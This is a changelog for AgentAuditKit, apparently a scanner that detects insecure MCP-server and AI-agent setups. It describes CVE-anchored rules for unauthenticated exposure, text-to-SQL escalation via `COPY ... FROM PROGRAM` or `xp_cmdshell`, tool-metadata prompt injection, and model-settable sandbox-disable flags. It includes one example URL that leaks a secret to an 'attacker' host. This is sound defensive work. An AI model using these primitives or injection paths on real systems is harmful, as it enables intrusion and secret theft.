# Changelog

All notable changes to AgentAuditKit are documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [Unreleased]

### Added — AAK-SKILL-UNTRUSTED-EXEC-PATH: untrusted-search-path executable override in skill/install flows ([CVE-2026-53819](https://nvd.nist.gov/vuln/detail/CVE-2026-53819))

CVE-response cycle item. New **HIGH** rule + scanner
(`scanners/skill_untrusted_exec_path.py`) flagging install / skill-setup code
that resolves an executable, interpreter, or build tool from a
**workspace-controlled source** and runs it without an absolute-path pin or
allowlist. Detected sources:

- a `.env` / dotenv-sourced variable (`load_dotenv()` then `os.environ.get(...)`
  / `os.getenv(...)` / `dotenv_values(...)`);
- a `PATH` prepended with a non-absolute / workspace dir
  (`os.environ["PATH"] = os.getcwd() + os.pathsep + ...`);
- `shutil.which(...)` resolved over such a tainted `PATH`;
- a Homebrew / package-manager binary chosen via an env override.

Anchor: **CVE-2026-53819** (CWE-426 Untrusted Search Path, CVSS 8.7) — OpenClaw
before 2026.5.27 let a workspace `.env` override the Homebrew executable
selection during skill install, executing unintended Homebrew-compatible
binaries to compromise the system. Python is analysed with stdlib `ast`; shell
install scripts use a guarded regex. Maps **CWE-426**, **MCP05:2025**, **ASI06**.
Distinct from `AAK-CLAUDE-WIN-001` (Windows ProgramData config-path hijack) and
the `AAK-SKILL-001..005` SKILL.md content checks. FP guards: absolute-path-pinned
binary, `os.path.isabs` / allowlist check, and non-install files all pass. SARIF
output carries the rule ID, CWE-426 (fullDescription), the fix hint (help text),
and the CVE tag.

Rule count **222 → 223**; scanner modules **76 → 77**. Version **0.3.36 → 0.3.37**.

### Changed — AAK-MCP-HTTP-NOAUTH-SERVER-001 extended to the launch surface ([CVE-2026-23744](https://nvd.nist.gov/vuln/detail/CVE-2026-23744))

CVE-response cycle item. **Extended the existing no-auth-transport rule** (not a
new duplicate — anti-duplicate check below) to flag the *launch* surface, where
an MCP server / the MCP Inspector binds a non-loopback interface with no auth:

- **MCP config files** — `mcp.json`, `claude_desktop_config.json`, `*.mcp.yaml`
  `command`/`args` declaring `--host 0.0.0.0` / `::` / a routable IP.
- **Docker** — `--host 0.0.0.0` and `-p 0.0.0.0:` publishes in
  `Dockerfile` / `docker-compose*.yml`.
- **MCP Inspector / FastMCP startup args** — `npx @modelcontextprotocol/inspector
  --host 0.0.0.0` with no `MCP_PROXY_AUTH_TOKEN` / `--token` / `requireAuth`, or
  with the `DANGEROUSLY_OMIT_AUTH` kill-switch set (overrides any token marker).

`CVE-2026-23744` (MCP Inspector, CVSS 9.8) is the motivating exemplar of the
launch-bind variant; Censys counted ~12,520 MCP services exposed on the public
internet in this shape. The rule already covered server *source* binding
`0.0.0.0` / wildcard CORS (GitLab/Nocturne/AgenticMail). Maps **CWE-306**,
**MCP07:2025**, **ASI03**. FP guards: 127.0.0.1 + token, `--require-auth`, and
non-MCP Docker/compose files with `0.0.0.0` all pass.

**Anti-duplicate check (G9):** `rg -i "0.0.0.0|bind|CWE-306|unauthenticated"`
over `agent_audit_kit/rules/` matched the pre-existing
`AAK-MCP-HTTP-NOAUTH-SERVER-001` (0.0.0.0 + no-auth, source-only). Per G9 the new
config/Docker/inspector patterns were **added to that rule + scanner**, not filed
as a separate `mcp_exposed_no_auth` rule. Rule count unchanged (**222**).

Version **0.3.35 → 0.3.36**.

### Added — AAK-LLM-SQL-RCE-001: LLM-generated SQL on an RCE-capable DB role ([CVE-2026-25879](https://nvd.nist.gov/vuln/detail/CVE-2026-25879))

CVE-response cycle item. New **CRITICAL** rule + scanner
(`scanners/llm_sql_rce.py`) for the text-to-SQL agent RCE class: an agent feeds
**model-generated SQL** into a database executor whose connection role holds
code-execution / filesystem privileges, so a prompt-injected
`COPY ... FROM PROGRAM` (PostgreSQL), `INTO OUTFILE` / `LOAD_FILE` (MySQL `FILE`
privilege), or `xp_cmdshell` (MS SQL) escalates SQL injection to shell.

Two detection arms (both emit the rule):

- **Flow** — an LLM-output value reaches a SQL-execution sink
  (`cursor.execute` / `conn.execute` / SQLAlchemy `text(...)`; TS `.query()` /
  `.raw()`) **as the query itself**, with no allow-list / `sqlglot`-style
  validation. Python uses a stdlib `ast` taint fixpoint (propagates through
  `response.choices[0].message.content`); TS/JS uses guarded regex.
- **Privilege** — a connection string / role granting the dangerous primitives
  (superuser account, or literal `COPY ... FROM PROGRAM` /
  `pg_execute_server_program` / `xp_cmdshell` / `GRANT ... FILE`) inside an
  LLM/agent context.

CVE-2026-25879 documents a "chat with your database" agent that ran model
output on a superuser connection. Maps **CWE-94 → CWE-89 → CWE-78** via
**CWE-250** (excess privilege); **MCP04:2025**, **ASI02** + **ASI05**.
Distinct from `AAK-TAINT-005` (tool *parameter* → SQL string-format). FP guards:
parameterised queries, validated/allow-listed flows, least-privilege read-only
roles, and non-agent DB-admin scripts all pass.

Rule count **221 → 222**; scanner modules **75 → 76**. Version
**0.3.34 → 0.3.35**.

### Added — AAK-MCP-HTTP-NOAUTH-SERVER-001: unauthenticated MCP HTTP/SSE server (2026 no-auth-transport class)

CVE-response backlog item. New **HIGH** rule + scanner
(`scanners/mcp_http_noauth_server.py`) flagging a repo that publishes an MCP
server over HTTP/SSE/Streamable-HTTP with **no inbound auth** while binding to
`0.0.0.0`/`::` or serving wildcard CORS — a mutation-capable, token-backed RPC
endpoint reachable without credentials.

Generalises the Azure-only `AAK-AZURE-MCP-NOAUTH-001` to any published MCP HTTP
server (defers on Azure-MCP repos to avoid double-firing). Also detects the
auth-bypass-when-token-unset variant. Covers a recurring 2026 shape: **GitLab
MCP Server (CVE-2026-44895)**, **Nocturne Memory (CVE-2026-44830)**,
**AgenticMail (CVE-2026-50287)**. Maps to **MCP07:2025** (Insufficient Auth),
**ASI03**. FP guards: authenticated handler, `127.0.0.1` bind, stdio server,
and Azure repos all pass.

### CVE-response backlog triage (23 issues closed)

Worked the full open `sla-48h` backlog. One genuine generalizable gap became a
rule (above, closing the GitLab/Nocturne/AgenticMail no-auth cluster); the rest
were dispositioned by verified triage — **no fabricated rules**:

- **Already covered by an existing rule/class** (closed with references):
  path traversal in MCP resource handlers → `AAK-MCP-015` (CVE-2026-9467);
  wildcard-CORS / DNS-rebind SSE → CORS-wildcard rule + `AAK-DNS-REBIND-*`
  (CVE-2026-9739); SSRF in MCP tool handlers → `AAK-SSRF-001..005`
  (CVE-2026-10280, CVE-2026-47250); LangChain deserialize / prompt-pull →
  `AAK-LANGCHAIN-001..003` + `AAK-LANGCHAIN-PROMPT-LOADER-PATH-001`
  (CVE-2026-44843, CVE-2026-45134).
- **OpenClaw runtime authz bugs** → tracked via the `AAK-OPENCLAW-PRIVESC-001`
  advisory; upgrade OpenClaw (CVE-2026-35674, -53814, -53818, -53820).
- **Out of static scope / vendor-runtime** (upgrade advisory, no scannable
  user-code pattern): Linux-kernel dm-ioctl (CVE-2026-46294, not MCP),
  Spring-AI/Java path-traversal & DCR-SSRF (CVE-2026-41863, -45609),
  n8n telemetry + multi-tenant fallback (CVE-2026-45582, -45707),
  OpenClaude OAuth-state logic bug (CVE-2026-42073), Roslyn .NET DLL load
  (CVE-2026-45555), LibreChat viewer-secret-exposure & IDOR-spread
  (CVE-2026-44653, CVE-2026-31942), claude-code-cache-fix statusline
  (CVE-2026-45136), mcp-google-workspace (CVE-2026-10277).
- **CVE-2026-44450** (Lumiverse args-injection, 9.9) closed earlier as covered
  by `AAK-MCP-STDIO-CMD-INJ-002` + `AAK-MCP-STDIO-LAUNCHER-INJECT-001`.

Rule count **220 → 221**; scanner modules **74 → 75**. Version **0.3.33 →
0.3.34**.

### Added — AAK-MCP-ENV-PLACEHOLDER-EXFIL-001: ${VAR} env-placeholder secret exfiltration (CVE-2026-32625)

CVE-response cycle item (closes #300). New **CRITICAL** rule + scanner
(`scanners/mcp_env_placeholder_exfil.py`) flagging an MCP server that resolves
`${VAR}` / `$VAR` placeholders against its own process environment
(`process.env`, `os.path.expandvars`, `.format(**os.environ)`) while handling a
user-supplied server config/URL. A user submitting
`https://attacker/?k=${JWT_SECRET}` then makes the server interpolate its own
secrets into the outbound request.

[CVE-2026-32625](https://nvd.nist.gov/vuln/detail/CVE-2026-32625): LibreChat
<= 0.8.3 resolved `${VAR}` against `process.env` during Zod validation of
user-supplied MCP server URLs, leaking `CREDS_KEY`, `JWT_SECRET`, `MONGO_URI`
(CWE-200, CVSS 9.6). Maps to **MCP01:2025** (Token Mismanagement), **ASI03**.
TS/JS detection is comment-stripped; gated to MCP-context files. FP guards:
verbatim URL use, plain `process.env` reads, non-MCP files, and a commented-out
pattern all pass.

### Anti-duplicate triage — CVE-2026-44450 closed as covered (no new rule)

CVE-2026-44450 (Lumiverse < 0.9.7, CWE-88, CVSS 9.9 — MCP endpoint allowlists
`command` but forwards `args` unvalidated; allowlisted binaries accept `-e`/`-c`
exec flags) was triaged and **closed as already covered** (#280): the
dynamic-args-to-spawn shape is `AAK-MCP-STDIO-CMD-INJ-002` and the
launcher+exec-flag insight is `AAK-MCP-STDIO-LAUNCHER-INJECT-001`. No duplicate
rule added.

Rule count **219 → 220**; scanner modules **73 → 74**; Secret-Exposure category
**17 → 18**. Version **0.3.32 → 0.3.33**.

### Added — AAK-MCP-TOOLGATE-ASYMMETRY-001: tools/list-vs-tools/call enforcement asymmetry (CVE-2026-46519)

CVE-response cycle item. New **HIGH** rule + scanner
(`scanners/mcp_toolgate_asymmetry.py`) flagging an MCP server that gates tools
by an allowlist / read-only / non-destructive control (e.g. `ALLOWED_TOOLS`,
`ALLOW_ONLY_NON_DESTRUCTIVE_TOOLS`, a `*READONLY*` / `*NON_DESTRUCTIVE*` env
var) and applies that check in the **discovery** handler (`tools/list` /
`list_tools` / `ListToolsRequestSchema`) but NOT in the **execution** handler
(`tools/call` / `call_tool` / `CallToolRequestSchema`). A client that calls a
hidden tool name directly bypasses the gate.

This is the [CVE-2026-46519](https://nvd.nist.gov/vuln/detail/CVE-2026-46519)
class: **mcp-server-kubernetes < 3.6.0** documented three env vars as access
controls but enforced them only at the discovery layer (CWE-863 Incorrect
Authorization, CVSS 8.8). Maps to **MCP06:2025** (Privilege Escalation),
**ASI04** + **ASI02**.

- **Python** is analysed with stdlib `ast` (precise per-handler bodies, so
  comments cannot mask the gate); **TS/JS** uses region-sliced regex with
  comment-stripping (a `// TODO: add readOnly check` comment can't create a
  false negative).
- This is an **enforcement-layer asymmetry** — explicitly distinct from
  `AAK-MCPWN-001` (transport-middleware *route* asymmetry, `/mcp_message` vs
  `/mcp`, CVE-2026-33032) and from the stateless-migration smells. Not
  collapsed.
- FP guards: gate-in-both-handlers passes; no-gate-anywhere passes;
  discovery-only (no call handler) passes.

Rule count **218 → 219**; scanner modules **72 → 73**; MCP-Configuration
category **48 → 49**. Version **0.3.31 → 0.3.32**.

### Changed — CrewAI chain: NVD severity reconciliation + evasion-gap closures

Audit of the existing CrewAI four-CVE chain rules (CVE-2026-2275/2285/2286/2287,
CERT/CC VU#221883) against NVD, plus an evasion-gap pass on
`scanners/crewai_rce_chain.py`. No new rule IDs — this corrects and hardens the
existing coverage.

- **Severity reconciliation (NVD CVSS):** `AAK-CREWAI-CVE-2026-2286-001` (RAG
  SSRF, CWE-918) and `AAK-CREWAI-CVE-2026-2287-001` (Docker-liveness fallback,
  CWE-94) are both **CVSS 9.8 CRITICAL** per NVD — bumped **HIGH → CRITICAL**
  (they were under-rated, which understated the score penalty and skipped
  `--fail-on critical` gates). `-2275-001` (CWE-749, 9.6) and `-2285-001`
  (7.5) confirmed already correct; descriptions enriched with the verified
  CWE/CVSS.
- **Evasion-gap closures** in the scanner (all with false-positive guards):
  - **Positional tool args** — `RagTool(user_url)` / `JSONSearchTool(user_path)`
    are now detected, not just the `url=`/`file_path=` keyword forms.
  - **Aliased tool imports** — `from crewai_tools import CodeInterpreterTool as
    CIT; CIT(unsafe_mode=True)` now resolves via an import-alias map.
  - **Import gate** — `import crewai_tools` (plain form) now passes the gate
    (previously only `from crewai_tools import …` did).

A static-literal positional arg and a no-crewai-import file still pass (FP
guards). Version **0.3.30 → 0.3.31**; rule/scanner counts unchanged.

### Added — AAK-MCP-STDIO-LAUNCHER-INJECT-001: MCP stdio launcher injection (CVE-2026-40933 class)

New **HIGH** rule + scanner (`scanners/mcp_stdio_launcher.py`) flagging MCP
**stdio** server definitions (`command` + `args` in a `mcpServers` / `servers`
block) that either launch a shell-style interpreter (`npx`, `node`, `bash`,
`sh`, `python`) with a code-execution flag (`-c`, `-e`, `--eval`), or pass a
non-pinned interpolation token (`${...}` embedded in a larger string,
`{{...}}`, `%s`) in argv.

This is the [CVE-2026-40933](https://nvd.nist.gov/vuln/detail/CVE-2026-40933)
class: **Flowise < 3.1.0** unsafely serialised stdio commands in its MCP
adapter, so an authenticated actor could register a stdio server whose
allowlisted launcher (`npx`) was combined with `-c` to run arbitrary OS
commands (CWE-78, CVSS 9.9). Maps to **MCP04:2025** (Command Injection),
**ASI05** + **ASI02**.

**Why this is not a duplicate** of existing STDIO coverage:
- `AAK-MCP-002` inspects only the `command` *string* for `sh -c`/`bash -c`
  wrappers and shell metacharacters — it never examines `args`, so the
  canonical split form `{"command":"npx","args":["-c","…"]}` was missed.
- `AAK-MCP-STDIO-CMD-INJ-001..004` are source-code taint analyzers
  (`StdioServerParameters(command=tainted)`), not `.mcp.json` config detectors.
- `AAK-FLOWISE-001` is Flowise-package/`.flowise`-config specific.

This rule is the config-level detector that closes that gap. A **standalone**
env reference (`${VAR}`) is treated as pinned and does not fire; HTTP/SSE MCP
servers (a `url` with no `command`) are out of scope.

Rule count **217 → 218**; scanner modules **71 → 72**; MCP-Configuration
category **47 → 48**. Version **0.3.29 → 0.3.30**.

### Added — AAK-AGENT-SHARED-RES-AUTHZ-001: shared-resource mutating op without per-actor authz (CVE-2026-44654 class)

New **HIGH** rule + scanner (`scanners/shared_resource_authz.py`) flagging
tool/function/MCP descriptors that expose a **mutating** operation
(delete / remove / edit / update / overwrite / move) on a file/record/resource
reachable in a **shared or multi-agent** context, when the input schema carries
**no per-actor authorization field** (owner / actor / authorization /
permission / `on_behalf_of` / …). Any agent that can call the tool could then
mutate another principal's resource.

This is the [CVE-2026-44654](https://nvd.nist.gov/vuln/detail/CVE-2026-44654)
broken-access-control class: **LibreChat <= 0.8.3** let a shared-agent editor
delete file records via `DELETE /api/files` that the owner had reused across
multiple agents (CWE-863 Incorrect Authorization, CVSS 8.1). Maps to
**MCP06:2025** (Privilege Escalation), **ASI04** (Identity & Privilege Abuse) +
**ASI02** (Tool Misuse).

- Requires **three** signals to fire (low false-positive by design): a mutate
  **verb _and_ a resource noun** in the tool name/description; a **shared
  context** — inferred from a multi-agent config (an `agents` collection with
  >1 member, or a `shared` / `scope: shared|workspace|team|org` marker) or from
  shared-resource language in the tool's own name/description; **and** the
  absence of any owner/actor/authorization property in the schema.
- **Opt-out:** a tool annotated `"x-aak-shared-authz": "global-ok"` (the
  resource is intentionally global to all agents) is suppressed.

Rule count **216 → 217**; scanner modules **70 → 71**; Trust-Boundary category
**11 → 12**. Version **0.3.28 → 0.3.29**.

### Added — AAK-MCP-SANDBOX-SELFDISABLE-001: LLM-settable sandbox-disable parameter (CVE-2026-42074 class)

New **CRITICAL** rule + scanner (`scanners/sandbox_self_disable.py`) flagging
tool/function JSON schemas and MCP tool descriptors that expose a parameter
whose name disables or weakens sandboxing/isolation
(`dangerouslyDisableSandbox`, `disable_sandbox`, `no_sandbox`, `allow_unsafe`,
`skip_isolation`, …) inside the model-facing `properties` — i.e. a flag the
LLM, an untrusted principal, can set in any `tool_use` response to turn off the
sandbox that contains tool execution.

This is the [CVE-2026-42074](https://nvd.nist.gov/vuln/detail/CVE-2026-42074)
class: **OpenClaude < 0.5.1** shipped `dangerouslyDisableSandbox` as part of
the BashTool input schema (CWE-284 / CWE-306, CVSS 9.8). Maps to
**MCP06:2025** (Privilege Escalation), **ASI06** (Unauthorized Capability
Acquisition) + **ASI04** (Identity & Privilege Abuse).

- Scans JSON-Schema `properties` under the standard tool-schema containers
  (`inputSchema` / `input_schema` / `parameters`) plus bare schema files;
  recurses nested object/array/`anyOf` params. Matches on the parameter
  **name**, not description text (that remains tool-poisoning's job).
- **Allowlist (pass with note):** a sandbox-control flag declared not
  LLM-settable — `readOnly: true`, `"x-aak-sandbox-control": "ops-only"`
  (also `operator-only` / `server-only`), or `"x-llm-settable": false` — is
  suppressed, since it is asserted to be host-set, not request-set.

Rule count **215 → 216**; scanner modules **69 → 70**; Trust-Boundary category
**10 → 11**. Version **0.3.27 → 0.3.28**.

### Changed — NSA MCP Security CSI mapping: coverage-gap audit (17 rules added)

A gap audit of the `nsa-mcp-csi-2026` compliance mapping (originally added in
PR #294) found rules that plainly evidence an existing CSI recommendation but
were never cited — and, in three cases, carry **no OWASP-Agentic ASI tag**, so
the `also_covers_asi` fan-out could never reach them. **17 rules** are now
explicitly mapped across 8 of the 9 CSI recommendation sections:

- **Constrain and sandbox tool execution (p.11)** — `AAK-HOOK-RCE-002`,
  `AAK-HOOK-RCE-003` (the same family as the already-cited `-001`), and generic
  egress SSRF `AAK-SSRF-001` / `-004` / `-005` (the v1 map cited only
  vendor-specific SSRF).
- **Scan local network for open/vulnerable MCP servers (p.14)** —
  `AAK-SSRF-002` (loopback reach), `AAK-SSRF-003` (cloud-metadata reach).
- **Validate parameters (p.11)** — `AAK-MCP-015` (path traversal in MCP
  resource handler), `AAK-LANGCHAIN-001` / `-002` (`load_prompt` path traversal).
- **Design for boundaries (p.10)** — `AAK-A2A-009` (unbounded delegation).
- **Sign and verify MCP messages (p.12)** — `AAK-A2A-004` (plaintext HTTP).
- **Instrument for logging and detection (p.13)** — `AAK-AGENT-004`.
- **Filter and monitor output pipelines (p.12)** — `AAK-AGENT-005`.
- **Track and patch MCP related vulnerabilities (p.13)** — `AAK-MCPFRAME-001`,
  `AAK-MCP-STATELESS-002` (ASI-less), `AAK-CLAUDE-WIN-001`.

Explicit NSA-cited rules went **94 → 111**. Thirteen rules remain deliberately
unmapped (internal sentinel, info-only coverage manifests, privacy-policy-doc,
frontend-DoS, pricing, and EU-locale-eval rules) — mapping them would fabricate
coverage; a new `test_deliberate_exclusions_stay_out_of_scope` test documents
and guards that decision. NSA test suite **25 → 43**.

**No new rule ID, no new framework, no version bump** — this only enriches an
existing framework's rule-to-control map.

### Changed — TS/JS taint scanner now covers SQL-injection sinks (AAK-TAINT-005 parity)

The TypeScript/JavaScript pattern scanner
(`agent_audit_kit/scanners/typescript_pattern_scan.py`) now flags raw /
interpolated SQL execution sinks under the existing **`AAK-TAINT-005`**
rule ("Tool parameter flows to SQL query"), closing a language-parity gap:
the Python taint engine (`cursor`/`connection`/`session.execute`) and the
Rust scanner (`sql!`/`query!` with `format!`) already implemented
`AAK-TAINT-005`, but the TS/JS scanner omitted it — despite its own module
docstring claiming "SQL template" coverage.

New sink matches (low false-positive by design — parameterized queries with
placeholder args are **not** flagged):

- Prisma `$queryRawUnsafe(...)` / `$executeRawUnsafe(...)` (explicitly-unsafe APIs)
- `knex` / driver `.raw(` + interpolated template literal
- `.query(...)` / `.execute(...)` with `${...}` template-literal interpolation
- `.query(...)` / `.execute(...)` with string concatenation

**No new rule ID, no version bump** — this extends an existing rule and an
existing scanner. Rule / scanner / category counts unchanged.

**Anti-duplicate result: `[DROP new rule — class already covered;
REFRAMED to the one real gap: TS/JS SQL-sink parity for AAK-TAINT-005]`.**

A prompt asked to add an "MCP-SDK / MCP-server RCE + tool-poisoning"
detector for the OX Security April-2026 disclosure. The class is already
covered end-to-end, so a new rule would duplicate:

- `AAK-STDIO-001` (CRITICAL, **OX-MCP-2026-04-15**) — taint to `subprocess` /
  `os.system` / `os.popen` / `eval` / `exec`.
- `AAK-MCP-STDIO-CMD-INJ-001..004` (CRITICAL, **OX-MCP-2026-04-25**) —
  network-controlled input to Stdio params (Python / TS / Java / Rust).
- `AAK-ANTHROPIC-SDK-001` (HIGH, **OX-MCP-2026-04-15**) — upstream SDK
  STDIO transport without an argv sanitizer.
- `AAK-MCP-TOOL-UNSAFE-EVAL-001` — `eval`/`exec`/`compile` inside an
  `@mcp.tool` handler.
- `AAK-TAINT-005` (Python + Rust) — SQL sink; plus named SQLi pins
  `AAK-DORIS-001` and `AAK-ASTROMCP-SQLI-CVE-2026-7591-001`.

The request's secondary ask — "flag MCP SDK versions pinned below the
patched release for the disclosed RCE" — rests on a false premise: the OX
2026-04-15 STDIO/RCE class has **no patched SDK release** (Anthropic
declined to CVE it; sanitization is the developer's responsibility), which
is why `AAK-ANTHROPIC-SDK-001` is a sanitizer-presence check rather than a
version pin. (A parameterized, updatable SDK version-floor check already
exists for a *different* class — `AAK-DNS-REBIND-002`, the DNS-rebinding
fix.) No fabricated CVE was introduced; the work is labelled to the **OX
Security MCP-SDK disclosure class** only.

The single genuine gap was TS/JS SQL-sink parity, addressed here by
extending `AAK-TAINT-005` rather than adding a duplicate rule.

**Tests:** 7 new in `tests/test_typescript_pattern_scan_sql.py` (the TS
pattern scanner previously had no dedicated test) — interpolated-template
SQL caught, string-concatenated SQL caught, Prisma `$queryRawUnsafe`
caught, `knex.raw` interpolation caught, parameterized query passes,
static parameter-free query passes, non-MCP file not scanned.

### Changed — MCP tool-poisoning now scans per-parameter descriptions

The tool-poisoning scanner (`agent_audit_kit/scanners/tool_poisoning.py`)
now feeds the existing `AAK-POISON-001..006` detectors with **every
per-parameter description** under a tool's input schema, not just the
tool's top-level `description` and the schema-level `inputSchema.description`.
`_extract_tool_descriptions` recursively walks
`inputSchema.properties.<param>.description` (plus `input_schema` and the
OpenAI `parameters` container), descending through nested object
properties, array `items`, and `anyOf`/`allOf`/`oneOf` combinators (depth
cap 6). This closes the indirect-prompt-injection-in-tool-metadata gap
where instruction text hides in a single argument's docstring rather than
the tool description. Findings are labelled `…/param:<dotted.path>` so they
point at the exact poisoned parameter.

**No new rule ID** — this is a coverage extension to the existing
`AAK-POISON-*` family. Rule count, scanner count, and category counts are
unchanged.

**Anti-duplicate result: `[REFRAMED — extends AAK-POISON-001..006 via
per-parameter sub-detector]`.** A prompt proposed a new MCP tool-poisoning
rule anchored to **CVE-2026-44338**. Declined as a new rule for two
reasons:

1. **Tool-poisoning shape already covered.** Indirect prompt injection via
   tool description/metadata is detected by `AAK-POISON-001` (invisible
   Unicode), `-002` (prompt-injection / role-switching markers), `-003`
   (cross-tool chaining), `-004` (encoded content), `-005` (length),
   `-006` (URL/path), plus `AAK-MCP-FHI-001` (imperative-override
   language). The only genuine gap was *parameter-level* descriptions,
   addressed by this extension rather than a duplicate rule.
2. **CVE mis-classification.** Per NVD, **CVE-2026-44338** is *PraisonAI*
   shipping a legacy Flask API server with **authentication disabled by
   default** (CWE-306 / CWE-668 / CWE-1188, CVSS 7.3, published
   2026-05-08) — an **auth-bypass**, not tool-metadata poisoning. Citing
   it on an `AAK-POISON-*` finding would encode a false CVE-to-attack
   mapping, so the CVE is **not** referenced by this change. (PraisonAI's
   Flask auth-bypass is a separate, currently-uncovered gap that would
   belong to the auth-bypass family — e.g. `AAK-MCP-SERVER-AUTH-*` — if
   pursued later; it was out of scope for this tool-poisoning request.)
   Source: <https://nvd.nist.gov/vuln/detail/CVE-2026-44338>.

**Tests:** 5 new in `tests/test_tool_poisoning.py` — poisoned single
param caught (with `param:<name>` evidence), nested-object param caught,
array-item param caught, OpenAI `parameters` container walked, and a
benign manifest with ordinary parameter docstrings producing **zero**
findings (false-positive guard).

**Headline: New rule pack `AAK-MCP-TUNNEL-001..003` (3 rules) for the
Anthropic MCP Tunnels research preview (launched 2026-05-19). Every
detection pattern is grounded in the official proxy-config schema at
`platform.claude.com/docs/en/agents-and-tools/mcp-tunnels/reference` —
field names taken verbatim from the reference table — so the rules
catch real misconfigurations rather than invented schema shapes. Also
adds `iso42001` (ISO/IEC 42001:2023 AI Management System) as a
first-class entry in `FRAMEWORKS`, closing a long-standing gap where
the `--framework iso42001` CLI choice existed but its runtime crosswalk
did not.**

Citations:

- **Anthropic MCP Tunnels** (research preview, 2026-05-19, Code with
  Claude London) — cloudflared agent makes a single outbound
  connection to the Anthropic tunnel edge; an Anthropic-side proxy
  terminates inner TLS, validates upstream IPs, and routes by
  hostname. Customer holds the tunnel token and server TLS private
  key as high-value secrets.
  <https://platform.claude.com/docs/en/agents-and-tools/mcp-tunnels/overview>
  <https://platform.claude.com/docs/en/agents-and-tools/mcp-tunnels/reference>
  <https://platform.claude.com/docs/en/agents-and-tools/mcp-tunnels/security>
- The New Stack — *"Anthropic debuts MCP tunnels and self-hosted
  sandboxes to lock down AI agent infrastructure"*, 2026-05.
- InfoQ — *"Anthropic Introduces MCP Tunnels for Private Agent Access
  to Internal Systems"*, 2026-05.

### Added

- **`AAK-MCP-TUNNEL-001`** *(MCP Configuration; CRITICAL; CWE-918)* —
  MCP Tunnels gateway proxy has `upstream.disable_ip_validation: true`
  OR an `upstream.allowed_ips` CIDR that covers the public internet
  (`0.0.0.0/0`, `::/0`, or an IPv4 prefix ≤ `/7`). The reference page
  calls `upstream.allowed_ips` the proxy's *"primary SSRF defense"*;
  disabling or widening it lets a malicious upstream-side process
  reach arbitrary hosts the proxy can route to.
- **`AAK-MCP-TUNNEL-002`** *(MCP Configuration; HIGH; CWE-295)* — an
  `https://` upstream is declared under `routes:` but neither
  `upstream.tls.ca_file` nor `upstream.tls.include_system_cas: true`
  is set. Quoting the reference: *"otherwise the proxy has no trust
  anchor for the upstream certificate."*
- **`AAK-MCP-TUNNEL-003`** *(MCP Configuration; CRITICAL; CWE-798)* —
  tunnel token or server TLS private key is checked into the repo or
  pinned as a literal value in a CI workflow. Triggers on literal
  `MCP_TUNNEL_TOKEN` / `TUNNEL_TOKEN` / `ANTHROPIC_TUNNEL_TOKEN` /
  `TUNNELS_API_TOKEN` / `ANTHROPIC_IDENTITY_TOKEN` env values in
  `.github/workflows/*.yml`, `.gitlab-ci.yml`, `azure-pipelines.yml`,
  `.circleci/config.yml`; PEM private keys committed under
  MCP-Tunnels paths (`mcp-tunnel/`, `mcp-gateway/`, `mcp-tunnels/`,
  etc.); and `kind: Secret` manifests named `mcp-tunnel` /
  `mcp-tunnel-token` / `mcp-tunnel-cert` carrying inline `data:`
  values. Suppresses on `${{ secrets.NAME }}` / `secrets.NAME` /
  `env.NAME` references and on empty placeholder Secrets.
- **`iso42001`** framework entry in `agent_audit_kit/output/compliance.py`
  `FRAMEWORKS`. Maps ISO/IEC 42001:2023 clauses 6.1.2 / 6.1.3 / 8.2 /
  8.3 and Annex A controls (A.5.1, A.6.2.3, A.6.2.4, A.6.2.6, A.7.4,
  A.8.2, A.8.3, A.10.1) to OWASP-Agentic ASI tokens, so existing rules
  with `owasp_agentic_references` automatically land under the right
  clauses. The `--framework iso42001` CLI choice and the PDF report's
  category mapping pre-existed; the runtime crosswalk was missing.
- **`nsa-mcp-csi-2026`** framework entry mapping the **NSA AISC
  Cybersecurity Information Sheet** "Model Context Protocol (MCP):
  Security Design Considerations for AI-Driven Automation"
  (**U/OO/6030316-26 | PP-26-1834, May 2026 Ver. 1.0**, published
  2026-05-20). The CSI body is prose with 9 named recommendation
  sections (pp.10-14); each is mapped here to the **exact AAK rule IDs
  that evidence it** (102 unique rule citations across the 9
  recommendations) AND a fan-out set of OWASP-Agentic ASI tokens so
  future rule additions auto-light the relevant control. This is a
  *mapping over existing rules* — no new scanner, no new rule IDs.
  Wired into `--framework nsa-mcp-csi-2026` (`report` command) and
  `--compliance nsa-mcp-csi-2026` (`scan` command); registered in
  `pdf_report._FRAMEWORK_TITLES` and `_CATEGORY_TO_CONTROL` for the
  PDF / text-report's `Findings by control` grouping. The 9 mapped
  recommendations, verbatim from the CSI:
    1. *Choose supported MCP projects when possible* (p.10)
    2. *Design for boundaries* (p.10)
    3. *Validate parameters* (p.11)
    4. *Constrain and sandbox tool execution* (p.11)
    5. *Sign and verify MCP messages* (p.12)
    6. *Filter and monitor output pipelines and chained execution* (p.12)
    7. *Instrument for logging and detection* (p.13)
    8. *Track and patch MCP related vulnerabilities* (p.13)
    9. *Scan local network for open or vulnerable MCP servers* (p.14)
  Source citation block at the head of every NSA CSI report includes
  the verbatim doc ID, title, publisher, publication date, and PDF
  URL so output is independently auditable. Primary source: NSA
  <https://www.nsa.gov/Portals/75/documents/Cybersecurity/CSI_MCP_SECURITY.pdf>,
  press release
  <https://www.nsa.gov/Press-Room/Press-Releases-Statements/Press-Release-View/Article/4496698/>.
- **Schema extension** to `agent_audit_kit/output/compliance.py`: the
  per-control value in `FRAMEWORKS[*]["controls"]` now accepts either
  the legacy `list[str]` of ASI tokens (existing 7 frameworks
  unchanged) OR a `dict` with `rule_ids` (curated direct mapping) +
  optional `also_covers_asi` (ASI fan-out). New `_resolve_control_rules`
  helper dispatches on the value type. Existing frameworks need no
  change.
- Optional **`source` block** on a framework entry; when present,
  `format_results` emits a verbatim citation header (doc ID, title,
  publisher, date, URL). Other frameworks can opt in by adding the
  block; the NSA CSI entry is the first user.

### Changed

- **`agent_audit_kit/scanners/mcp_tunnel.py`** is a new scanner module
  (PyYAML-parsed). Registered via `_OPTIONAL_SCANNERS` so missing
  PyYAML degrades gracefully rather than breaking scans.
- **Compliance surface**: every TUNNEL rule carries
  `owasp_agentic_references` between `ASI02..ASI06`, so findings auto-land
  under EU AI Act **Article 15** (Robustness & Security), SOC 2
  **CC6.1 / CC6.3 / CC6.7**, ISO 27001 **A.8.24 / A.5.23**, HIPAA
  **164.312(d)**, and the new ISO 42001 clauses without any
  per-framework rewiring.
- **README**: `<!-- rule-count -->` anchors auto-sync to **215** rules,
  MCP Configuration category count to **47**, scanner count to **69**.
  Category description extends with the MCP Tunnels gateway items.

